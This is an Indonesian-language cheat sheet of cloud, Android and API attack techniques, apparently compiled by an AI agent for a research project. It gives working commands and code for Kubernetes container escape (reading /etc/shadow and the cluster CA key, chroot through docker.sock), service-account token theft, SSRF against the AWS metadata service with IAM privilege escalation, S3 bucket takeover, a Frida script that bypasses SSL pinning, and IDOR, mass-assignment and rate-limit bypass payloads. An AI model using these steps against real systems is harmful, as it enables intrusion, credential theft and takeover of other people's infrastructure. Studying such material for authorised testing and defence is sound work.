# Cloud-Native, Mobile & API Attack Techniques (2024-2026)

**Sumber:** HackTricks, OWASP, Google Project Zero, Black Hat, CVE Database

---

## 1. CLOUD-NATIVE ATTACKS

### A. Kubernetes Pod Escape

#### Container Breakout via Privileged Pod
```bash
# Cek apakah container berjalan sebagai privileged
cat /proc/self/status | grep CapEff
# Jika CapEff = 0000003fffffffff → privileged!

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host   # atau /dev/xvda1 di AWS

# Baca secrets host
cat /mnt/host/etc/kubernetes/pki/ca.key
cat /mnt/host/etc/shadow
```

#### Escape via hostPath Mount
```yaml
# Pod spec yang rentan
volumes:
  - name: host-vol
    hostPath:
      path: /    # Mount root filesystem!
```
Jika pod punya hostPath `/`, attacker dapat baca/tulis seluruh filesystem host.

#### Escape via Docker Socket
```bash
# Cek apakah docker.sock ter-mount
ls -la /var/run/docker.sock

# Jika ada → escape ke host via container baru
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it ubuntu chroot /host bash
```

#### Token Theft & Lateral Movement
```bash
# Ambil service account token (default terpasang di semua pod)
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Gunakan token untuk query API server
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
        --server=https://kubernetes.default.svc get pods --all-namespaces

# Jika ClusterAdmin → buat pod baru dengan akses penuh
kubectl apply -f evil-pod.yaml
```

---

### B. AWS IAM Privilege Escalation via SSRF + Metadata

#### Step 1: Exploit SSRF ke Metadata Service
```
# Target URL (IMDSv1 - tidak butuh token)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 (butuh token terlebih dahulu)
# Ambil token dulu:
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Gunakan token:
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
Header: X-aws-ec2-metadata-token: <token>
```

#### Step 2: Gunakan Credentials yang Ditemukan
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Enum permissions
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
aws iam list-user-policies --user-name ...

# Escalation paths
aws iam create-policy-version  # jika punya iam:CreatePolicyVersion
aws iam attach-user-policy     # jika punya iam:AttachUserPolicy
```

#### Common IAM Privesc Paths
| Permission | Escalation Technique |
|---|---|
| `iam:CreatePolicyVersion` | Buat versi baru policy dengan `*:*` |
| `iam:SetDefaultPolicyVersion` | Revert ke versi lama yang lebih permisif |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 dengan role yang lebih tinggi |
| `iam:AttachUserPolicy` | Attach AdministratorAccess ke user sendiri |
| `lambda:CreateFunction` + `iam:PassRole` | Lambda dengan admin role → RCE |
| `sts:AssumeRole` | Assume role dengan permission lebih tinggi |

---

### C. S3 Bucket Misconfiguration

#### Enumeration Teknik
```bash
# Cek apakah bucket publik
aws s3 ls s3://target-bucket --no-sign-request

# Cek ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# List semua object
aws s3 ls s3://target-bucket/ --recursive --no-sign-request

# Download file
aws s3 cp s3://target-bucket/secret.key . --no-sign-request
```

#### Bucket Takeover (Subdomain Takeover)
```
1. Cari CNAME pointing ke S3: assets.target.com → assets.target.com.s3-website.us-east-1.amazonaws.com
2. Jika bucket tidak ada → daftarkan bucket dengan nama yang sama
3. Upload konten berbahaya
4. assets.target.com sekarang mengarah ke bucket Anda!
```

#### Upload Attack (jika ACL AllowWrite ke publik)
```bash
# Upload file berbahaya
aws s3 cp evil.html s3://writable-bucket/ --no-sign-request --acl public-read

# Atau eksekusi script via S3 event trigger jika Lambda terhubung
```

---

## 2. ANDROID SECURITY

### A. SSL Pinning Bypass

#### Method 1: Frida Script
```javascript
// frida-ssl-bypass.js
Java.perform(function() {
    // Bypass TrustManager
    var TrustManager = Java.registerClass({
        name: 'com.ouroboros.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    // Bypass SSLContext
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom'
    ).implementation = function(km, tm, sr) {
        this.init(km, [TrustManager.$new()], sr);
    };

    // Bypass OkHttp Certificate Pinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function() { return; };
        CertificatePinner.check.overload('java.lang.String', 'java.security.cert.Certificate')
            .implementation = function() { return; };
    } catch(e) {}
});
```

```bash
# Jalankan bypass
frida -U -l frida-ssl-bypass.js -f com.target.app --no-pause
```

#### Method 2: Objection (lebih mudah)
```bash
# Install
pip install objection

# Patch APK
objection patchapk --source target.apk

# Atau inject ke proses yang berjalan
objection -g com.target.app explore

# Bypass SSL Pinning dengan satu perintah
android sslpinning disable
```

#### Method 3: APK Patching Manual
```bash
# Decompile APK
apktool d target.apk -o target_decompiled/

# Edit AndroidManifest.xml → tambah network security config
# Edit res/xml/network_security_config.xml:
# <trust-anchors><certificates src="user"/></trust-anchors>

# Recompile
apktool b target_decompiled/ -o target_patched.apk

# Sign APK
keytool -genkey -v -keystore my.keystore -alias alias_name -keyalg RSA
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my.keystore target_patched.apk alias_name
```

---

### B. APK Reversing Workflow

```bash
# 1. Extract APK ke bytecode
apktool d app.apk -o app_smali/

# 2. Decompile Java dari DEX
jadx -d app_java/ app.apk

# 3. Cari API keys dan secrets
grep -r "api_key\|secret\|password\|token\|AWS\|firebase" app_java/ --include="*.java"

# 4. Cari endpoint
grep -r "http://\|https://" app_java/ --include="*.java" | grep -v "//.*http"

# 5. Analisis dynamic
adb logcat | grep -i "error\|exception\|debug\|api\|token"

# 6. Intercept traffic dengan Burp
adb shell settings put global http_proxy 192.168.1.100:8080
```

---

## 3. API SECURITY

### A. BOLA / IDOR (Broken Object Level Authorization)

#### Deteksi Pattern
```
# Endpoint dengan ID objek → target IDOR
GET /api/users/12345/profile
GET /api/orders/ORDER-001/details
GET /api/documents/DOC-XYZ

# Coba dengan ID orang lain
GET /api/users/12346/profile    ← milik user lain!
GET /api/orders/ORDER-002/details
```

#### Bypass Teknik
```
# Integer ID → increment/decrement
/api/invoice/1001 → /api/invoice/1000

# UUID → tidak bisa brute force, tapi cari di response/logs lain

# Parameter pollution
GET /api/profile?user_id=123&user_id=456  ← mana yang dipakai?

# HTTP Method switch
GET /api/admin/users/1 → 403
POST /api/admin/users/1 → 200?

# Accept header
GET /api/profile (JSON) → 200 dengan data terbatas
GET /api/profile (XML) → 200 dengan lebih banyak field?

# Version switch
/api/v2/users/1 → validasi ketat
/api/v1/users/1 → tidak ada otorisasi?
```

### B. Mass Assignment

```bash
# Endpoint pendaftaran normal:
POST /api/register
{"username": "attacker", "password": "pass123"}

# Coba tambahkan field admin/role
POST /api/register
{"username": "attacker", "password": "pass123", "role": "admin", "is_admin": true, "verified": true}

# Atau di update profile:
PUT /api/users/123/profile
{"name": "Test", "balance": 999999, "subscription": "premium"}
```

### C. Rate Limiting Bypass

```
# Technique 1: Header manipulation
X-Forwarded-For: 1.2.3.4          (rotasi IP)
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12

# Technique 2: IP spoofing via proxy header
X-Forwarded-For: 127.0.0.1       (jika localhost di-bypass)

# Technique 3: Path variation
/api/login
/api/login/
/api//login
/api/Login
/api/LOGIN

# Technique 4: Parameter pollution
POST /api/login
username=admin&password=pass1&username=admin&password=pass2

# Technique 5: Timing (untuk time-window rate limits)
→ kirim burst di detik ke-1, tunggu reset, burst lagi
```

---

*Riset Batch 3 - Cloud, Android, API Security — Project Omniscience*
*Dihasilkan langsung oleh Main Agent (kuota subagent habis)*
